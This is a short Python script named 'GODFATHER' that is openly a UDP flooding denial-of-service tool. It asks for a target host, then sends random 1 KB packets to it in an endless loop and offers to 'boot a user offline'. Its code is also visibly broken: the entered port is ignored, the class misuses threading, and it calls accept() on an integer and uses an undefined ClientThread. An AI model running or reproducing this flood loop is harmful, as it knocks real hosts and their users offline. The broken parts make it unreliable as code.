#!/usr/bin/python3.7
"""
G O D F A T H E R

"""

import socket
import threading
import random
import time

class flooding:
	def __init__(self, host, port):
		threading.Thread.__init__(self)
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.host = host
		self.port = 80
		self.duration = 0
		self.bytes = random._urandom(1024)
		self.send = 0

	@classmethod
	def input(name):
		return name(
			input("Host: "),
                        int(input("Port: "))
                )

	def send_packet(self):
		while True:
			try:
				send_all = self.connection.sendto(self.bytes,(self.host, self.port))
				print("[+]flooding started on" + self.host)
			except UnboundLocalError:
				try:
					pass
					send_all = self.connection.sendto(self.bytes,(self.host, self.port))
				except:
					pass
			except KeyboardInterrupt:
				print("\n")
				print("[+]Existing... ")
				print("\n")
		while True:
			connect_all = send_all.accept()
			newthread = ClientThread(send_all)
			newthread.start()

			print("ctrl+c")
			more_dos = input("[+] would you like to boot a user offline[exit/return]")

			if more_dos == "exit":
				self.connection.close()
				exit()
			elif more_dos == "return":
				self.send_packet()
			else:
				self.connection.close()
				exit()

attack = flooding.input()
attack.send_packet()
